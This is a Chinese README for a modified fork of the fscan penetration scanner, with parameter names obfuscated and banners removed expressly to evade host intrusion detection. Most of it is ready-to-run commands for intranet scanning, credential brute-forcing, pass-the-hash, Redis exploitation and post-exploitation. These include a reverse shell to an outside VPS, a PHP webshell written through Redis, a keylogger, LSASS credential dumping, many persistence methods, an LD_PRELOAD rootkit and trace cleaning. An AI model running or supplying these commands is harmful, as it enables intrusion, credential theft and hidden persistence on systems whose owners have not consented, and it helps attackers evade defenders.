# Fscan 魔改版 — 内网渗透扫描工具

> 基于 [fscan](https://github.com/shadow1ng/fscan) v2.2.0-rc 修改，针对红队场景进行了参数混淆与特征规避。

---

## 目录

- [快速开始](#快速开始)
- [魔改说明](#魔改说明)
- [参数速查](#参数速查)
- [使用场景](#使用场景)
  - [内网扫描](#1-内网扫描)
  - [端口与协议控制](#2-端口与协议控制)
  - [弱口令爆破](#3-弱口令爆破)
  - [Web 扫描](#4-web-扫描)
  - [POC 漏洞检测](#5-poc-漏洞检测)
  - [凭据复用与哈希传递](#6-凭据复用与哈希传递)
  - [后渗透利用](#7-后渗透利用)
  - [输出控制](#8-输出控制)
- [扫描模式](#扫描模式)
- [支持的爆破服务](#支持的爆破服务)
- [后渗透插件列表](#后渗透插件列表)
- [WebUI 模式](#webui-模式)
- [构建方法](#构建方法)

---

## 快速开始

```bash
# 扫描一个 C 段（存活探测 + 端口扫描 + 服务识别 + 弱口令爆破 + POC）
pscan.exe -t 192.168.1.0/24

# 仅存活探测
pscan.exe -t 192.168.1.0/24 -ao

# 扫描单个主机
pscan.exe -t 192.168.1.100

# 扫描多个 IP 段
pscan.exe -t 192.168.1.0/24,10.0.0.0/24

# 从文件读取目标
pscan.exe -tf targets.txt
```

---

## 魔改说明

本版本对原版 fscan 做了以下修改以规避 HIDS 特征检测：

| 修改项 | 说明 |
|--------|------|
| **参数名混淆** | 所有命令行参数重命名（见下方映射表） |
| **Banner 静默** | 启动时不输出 fscan ASCII Logo 和版本信息 |
| **模块名重命名** | Go 模块路径改为 `scanner/core`，去除项目名特征 |
| **预编译二进制** | 提供 `pscan.exe` 和 `core.exe` 两个版本 |

**原版 ↔ 魔改参数映射：**

| 原参数 | 魔改后 | 说明 |
|--------|--------|------|
| `-h` | **`-t`** | 目标 IP / 网段 / 域名 |
| `-eh` | **`-et`** | 排除主机 |
| `-ehf` | **`-etf`** | 排除主机文件 |
| `-p` | **`-tp`** | 端口 |
| `-ep` | **`-etp`** | 排除端口 |
| `-hf` | **`-tf`** | 主机列表文件 |
| `-pf` | **`-tpf`** | 端口列表文件 |
| `-m` | **`-st`** | 扫描模式 |
| `-t`（线程） | **`-tn`** | 端口扫描线程数 |
| `-time` | **`-tm`** | 超时时间(秒) |
| `-user` | **`-usr`** | 用户名 |
| `-pwd` | **`-pw`** | 密码 |
| `-usera` | **`-ua`** | 额外用户名 |
| `-pwda` | **`-pa`** | 额外密码 |
| `-userf` | **`-usrf`** | 用户名字典文件 |
| `-pwdf` | **`-pf`** | 密码字典文件 |
| `-upf` | **`-up`** | 用户名:密码对文件 |
| `-hashf` | **`-hf`** | 哈希文件 |
| `-hash` | **`-hv`** | 哈希值 |
| `-domain` | **`-dm`** | 域名 |
| `-sshkey` | **`-sk`** | SSH 私钥 |

---

## 参数速查

```text
目标参数：
  -t string        目标主机: IP, 网段(CIDR), 域名 (必填)
  -tf string       主机列表文件
  -tp string       端口，默认1000个常用端口
  -tpf string      端口列表文件
  -et string       排除主机
  -etf string      排除主机文件
  -etp string      排除端口

扫描控制：
  -st string       扫描模式: all(全部), icmp(存活探测), 或指定插件名 (default "all")
  -ao              仅存活探测
  -tn int          端口扫描线程数 (default 600)
  -mt int          模块线程数 (default 20)
  -tm int          超时时间秒 (default 3)
  -gt int          全局超时秒 (default 180)
  -np              禁用 Ping 探测
  -ntp             禁用 TCP 补充探测
  -rate int        每分钟最大发包数 (0=不限制)
  -maxpkts int     最大发包总数 (0=不限制)
  -icmp-rate float ICMP 发包速率 (default 0.1)

凭据参数：
  -usr string      用户名
  -pw string       密码
  -ua string       额外用户名 (逗号或空格分隔)
  -pa string       额外密码 (逗号或空格分隔)
  -usrf string     用户名字典文件
  -pf string       密码字典文件
  -up string       用户名:密码对文件
  -dm string       域名
  -sk string       SSH 私钥文件
  -hf string       哈希文件
  -hv string       哈希值

功能开关：
  -nobr            禁用暴力破解
  -nopoc           禁用 POC 扫描
  -noredis         禁用 Redis 利用
  -full            全量 POC 扫描
  -pocpath string  POC 脚本路径
  -pocname string  POC 名称
  -num int         POC 并发数 (default 20)
  -dns             DNS 日志记录

代理/网络：
  -proxy string    HTTP 代理
  -socks5 string   SOCKS5 代理
  -iface string    指定本地网卡 IP

输出：
  -o string        输出文件 (default "result.txt")
  -f string        输出格式: txt, json, csv (default "txt")
  -no              禁用保存到文件
  -silent          静默模式
  -nocolor         禁用颜色
  -nopg            禁用进度条
  -debug           调试模式
  -log string      日志级别
  -perf            输出性能统计 JSON

其他：
  -lang string     语言: zh, en (default "zh")
  -help            显示帮助
```

---

## 使用场景

### 1. 内网扫描

```bash
# 全量扫描整个 C 段（最常用）
pscan.exe -t 192.168.1.0/24

# 仅存活探测（快速定位在线主机）
pscan.exe -t 192.168.1.0/24 -ao

# ICMP 模式存活探测
pscan.exe -t 192.168.1.0/24 -st icmp

# 存活探测 + 仅在线主机做端口扫描（跳过离线主机）
pscan.exe -t 192.168.1.0/24 -ao -st all

# 扫描多个网段
pscan.exe -t 192.168.1.0/24,10.10.0.0/16

# 扫描 IP 范围
pscan.exe -t 192.168.1.1-100

# 排除特定主机
pscan.exe -t 192.168.1.0/24 -et 192.168.1.1,192.168.1.254

# 从文件读取目标列表
pscan.exe -tf targets.txt
```

### 2. 端口与协议控制

```bash
# 扫描指定端口
pscan.exe -t 192.168.1.0/24 -tp 22,80,443,3306,3389,6379

# 扫描常用 Web 端口
pscan.exe -t 192.168.1.0/24 -tp 80,81,443,8080,8443,9090

# 扫描全部端口（慢，谨慎使用）
pscan.exe -t 192.168.1.0/24 -tp 1-65535 -tn 1000

# 排除特定端口
pscan.exe -t 192.168.1.0/24 -etp 445,139

# 跳过 Ping 探测（纯 TCP 扫描，适合禁 Ping 环境）
pscan.exe -t 192.168.1.0/24 -np

# 跳过 TCP 补充探测
pscan.exe -t 192.168.1.0/24 -ntp

# 调整扫描线程和超时（网络差时降低线程数）
pscan.exe -t 192.168.1.0/24 -tn 200 -tm 5

# 限制发包速率（规避流量检测）
pscan.exe -t 192.168.1.0/24 -rate 1000
```

### 3. 弱口令爆破

```bash
# 全量扫描 + 自动爆破（默认开启）
pscan.exe -t 192.168.1.0/24

# 禁用爆破（只扫端口和服务识别）
pscan.exe -t 192.168.1.0/24 -nobr

# 指定自定义凭据
pscan.exe -t 192.168.1.0/24 -usr admin -pw admin123

# 使用字典文件
pscan.exe -t 192.168.1.0/24 -usrf users.txt -pf pass.txt

# 使用用户名:密码对文件（每行 user:pass）
pscan.exe -t 192.168.1.0/24 -up creds.txt

# 添加额外用户/密码（与原字典合并）
pscan.exe -t 192.168.1.0/24 -ua root,admin -pa 123456,password

# 指定域名（用于域认证爆破）
pscan.exe -t 192.168.1.0/24 -dm corp.local

# SSH 私钥登录
pscan.exe -t 192.168.1.100 -sk id_rsa

# NTLM 哈希传递
pscan.exe -t 192.168.1.100 -hv "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
```

### 4. Web 扫描

```bash
# 扫描单个 Web 站点
pscan.exe -u http://192.168.1.100:8080

# 扫描多个 URL
pscan.exe -u http://192.168.1.100 -tp 80,443,8080

# 带 Cookie 扫描
pscan.exe -u http://192.168.1.100 -cookie "PHPSESSID=xxx"

# 使用 HTTP 代理
pscan.exe -u http://192.168.1.100 -proxy http://127.0.0.1:8080

# 使用 SOCKS5 代理
pscan.exe -t 192.168.1.0/24 -socks5 socks5://127.0.0.1:1080

# 指定网卡（VPN 场景）
pscan.exe -t 10.8.0.0/24 -iface 10.8.0.5
```

### 5. POC 漏洞检测

```bash
# 全量扫描 + POC 检测（默认开启）
pscan.exe -t 192.168.1.0/24

# 禁用 POC 扫描（加快速度）
pscan.exe -t 192.168.1.0/24 -nopoc

# 全量 POC 扫描（更全面但更慢）
pscan.exe -t 192.168.1.0/24 -full

# 指定 POC 名称
pscan.exe -t 192.168.1.100 -pocname thinkphp

# 自定义 POC 脚本目录
pscan.exe -t 192.168.1.100 -pocpath ./custom-pocs/

# 调整 POC 并发数
pscan.exe -t 192.168.1.0/24 -num 10

# 启用 DNSLog
pscan.exe -t 192.168.1.0/24 -dns
```

### 6. 凭据复用与哈希传递

```bash
# NTLM 哈希传递（配合爆破模块使用）
pscan.exe -t 192.168.1.100 -hv "31d6cfe0d16ae931b73c59d7e0c089c0"

# 哈希文件批量传递
pscan.exe -t 192.168.1.0/24 -hf hashes.txt

# 复用域用户凭据
pscan.exe -t 192.168.1.0/24 -usr administrator -pw P@ssw0rd -dm corp.local
```

### 7. 后渗透利用

```bash
# 查看所有可用本地插件
pscan.exe -local list

# 收集系统信息
pscan.exe -local systeminfo

# 反弹 Shell（先在外网 VPS 监听）
pscan.exe -local reverseshell -rsh your-vps.com:4444

# 启动正向 Shell（等待目标连接）
pscan.exe -local forwardshell -fsh-port 4444

# 启动 SOCKS5 代理（本地监听 1080）
pscan.exe -local socks5proxy -start-socks5 1080

# Redis 写公钥
pscan.exe -t 192.168.1.100 -st redis -rs "ssh-rsa AAAAB3N..."

# Redis 写 Webshell
pscan.exe -t 192.168.1.100 -st redis -rwp /var/www/html -rwc "<?php system($_GET['cmd']);?>"

# 键盘记录
pscan.exe -local keylogger -keylog-output keylog.txt

# LSASS 凭证提取
pscan.exe -local minidump

# Windows 持久化（启动项）
pscan.exe -local winstartup -win-pe C:\shell.exe

# 清理痕迹
pscan.exe -local cleaner
```

### 8. 输出控制

```bash
# 指定输出文件
pscan.exe -t 192.168.1.0/24 -o scan-result.txt

# JSON 格式输出
pscan.exe -t 192.168.1.0/24 -f json -o result.json

# CSV 格式输出
pscan.exe -t 192.168.1.0/24 -f csv -o result.csv

# 不保存文件，仅屏幕输出
pscan.exe -t 192.168.1.0/24 -no

# 静默模式（减少输出量）
pscan.exe -t 192.168.1.0/24 -silent

# 调试模式（详细日志）
pscan.exe -t 192.168.1.0/24 -debug

# 输出性能统计
pscan.exe -t 192.168.1.0/24 -perf
```

---

## 扫描模式

通过 `-st` 参数指定扫描模式：

| 模式 | 说明 |
|------|------|
| `all` | 默认，存活探测 + 端口扫描 + 服务识别 + 弱口令爆破 + POC |
| `icmp` | 仅 ICMP 存活探测 |
| `ping` | 类似 icmp，配合 `-ao` 使用 |
| `portscan` | 仅端口扫描 |
| `redis` | 仅 Redis 扫描 + 利用 |
| `ssh` | 仅 SSH 扫描 + 爆破 |
| `mysql` | 仅 MySQL 扫描 + 爆破 |
| `mssql` | 仅 MSSQL 扫描 + 爆破 |
| `smb` | 仅 SMB 扫描 + MS17010 |
| `rdp` | 仅 RDP 扫描 + 爆破 |
| ... | 其他服务插件名均可作为模式 |

```bash
# 示例：仅扫描 Redis 服务
pscan.exe -t 192.168.1.0/24 -st redis

# 示例：仅扫描 SMB 和相关漏洞
pscan.exe -t 192.168.1.0/24 -st smb
```

---

## 支持的爆破服务

| 服务 | 插件 | 默认端口 |
|------|------|----------|
| MySQL | mysql | 3306 |
| MSSQL | mssql | 1433 |
| Oracle | oracle | 1521 |
| PostgreSQL | postgresql | 5432 |
| Redis | redis | 6379 |
| MongoDB | mongodb | 27017 |
| Elasticsearch | elasticsearch | 9200 |
| SSH | ssh | 22 |
| FTP | ftp | 21 |
| Telnet | telnet | 23 |
| SMB | smb | 445 |
| RDP | rdp | 3389 |
| VNC | vnc | 5900 |
| LDAP | ldap | 389 |
| SMTP | smtp | 25 |
| POP3 | pop3 | 110 |
| IMAP | imap | 143 |
| SNMP | snmp | 161(UDP) |
| DNS | dns | 53 |
| Rsync | rsync | 873 |
| Memcached | memcached | 11211 |
| RabbitMQ | rabbitmq | 5672 |
| ActiveMQ | activemq | 61616 |
| Kafka | kafka | 9092 |
| Zookeeper | zookeeper | 2181 |
| Neo4j | neo4j | 7687 |
| Cassandra | cassandra | 9042 |
| MQTT | mqtt | 1883 |
| Modbus | modbus | 502 |
| BACnet | bacnet | 47808 |
| IPMI | ipmi | 623 |
| NetBIOS | netbios | 137-139 |
| NFS | nfs | 2049 |
| RMI | rmi | 1099 |
| JDWP | jdwp | 5005 |

---

## 后渗透插件列表

通过 `-local` 参数调用：

| 插件名 | 功能 | 平台 |
|--------|------|------|
| `systeminfo` | 系统信息收集 | 全平台 |
| `reverseshell` | 反弹 Shell | 全平台 |
| `forwardshell` | 正向 Shell | Windows |
| `socks5proxy` | 启动 SOCKS5 代理 | 全平台 |
| `keylogger` | 键盘记录 | Windows |
| `minidump` | LSASS 凭据提取 | Windows |
| `sshkey` | SSH 公钥注入 | Linux |
| `cleaner` | 痕迹清理 | 全平台 |
| `crontask` | Cron 持久化 | Linux |
| `systemdservice` | Systemd 服务持久化 | Linux |
| `ldpreload` | LD_PRELOAD Rootkit | Linux |
| `winregistry` | 注册表持久化 | Windows |
| `winschtask` | 计划任务持久化 | Windows |
| `winservice` | 服务持久化 | Windows |
| `winstartup` | 启动项持久化 | Windows |
| `winlogon` | 登录脚本持久化 | Windows |
| `winwmi` | WMI 持久化 | Windows |
| `winbits` | BITS 任务持久化 | Windows |
| `winifeo` | IFEO 持久化 | Windows |

```bash
# 列出所有本地插件
pscan.exe -local list

# 使用特定插件
pscan.exe -local systeminfo
```

---

## WebUI 模式

本工具内置了 Web 管理界面（需使用 web 版本编译）。

```bash
# 启动 Web 服务
pscan-web.exe

# 指定监听端口
pscan-web.exe -u

# 启动后访问 http://127.0.0.1:8080
```

WebUI 功能：
- 图形化扫描任务管理
- 实时 WebSocket 结果推送
- 扫描预设保存
- 资产项目管理
- 多语言支持（中文/English）
- 深色模式

---

## 构建方法

```bash
# 基础构建
go build -o pscan.exe .

# 包含 WebUI 的版本
go build -tags web -o pscan-web.exe .

# 调试版本（保留符号）
go build -o pscan-debug.exe -gcflags="all=-N -l" .

# UPX 压缩（减小体积）
upx -9 pscan.exe

# 交叉编译
GOOS=linux GOARCH=amd64 go build -o pscan_linux .
GOOS=darwin GOARCH=amd64 go build -o pscan_macos .
```
